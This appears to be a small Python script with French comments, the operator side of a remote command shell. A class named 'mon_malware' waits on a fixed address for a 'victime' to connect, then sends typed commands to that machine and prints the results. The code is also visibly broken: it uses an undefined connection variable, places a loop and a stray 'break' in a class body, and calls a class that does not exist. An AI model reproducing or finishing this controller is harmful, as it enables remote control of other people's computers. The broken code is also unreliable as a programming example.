import socket, sys, os, time, threading

ENCODING = 'UTF-8'
CLIENT_IP = "10.101.126.172"
PORT = 50000
VICTIME_IP = "" # ? Peut-on la modifier en ligne 19?


#classe concernant la connexion / deconnexion
class mon_malware():

    def __init__(self):
        self.s = socket.socket()
        self.s.bind((CLIENT_IP, PORT))

    def listen(self):
        self.s.listen(1)
        print("En Attente du client...")
        try:
            conn, addr = self.s.accept()
            VICTIME_IP = addr[0]
            print("Client : %s" %VICTIME_IP) # Récupération de l'IP de la victime
        except socket.timeout:
            self.disconnect()
            print("[!] Aucune réponse du client")
        except:
            self.disconnect()
            print("[!] Erreur lors de la connexion")

    def disconnect(self ):
        self.s.close()
        print("Déconnexion du client.")


# Toutes les commandes
class Commands():
    while True:
        command = input("#>")
        if command != "exit()":
            if command == "":
                continue

            conn.send(command.encode(ENCODING))
            result = conn.recv(1024).decode(ENCODING)
            total_size = len(result[:16])
            result = result[16:]

            while total_size > len(result):
                data = conn.recv(1024)
                result += data
            print(result)
            print("\n")

        else:
            conn.send("exit()")
            print("Connexion fermée")
    break


# Menu d'affichage
class Menu():
    pass


concombre = Connexion()
concombre.connect()
concombre.disconnect()
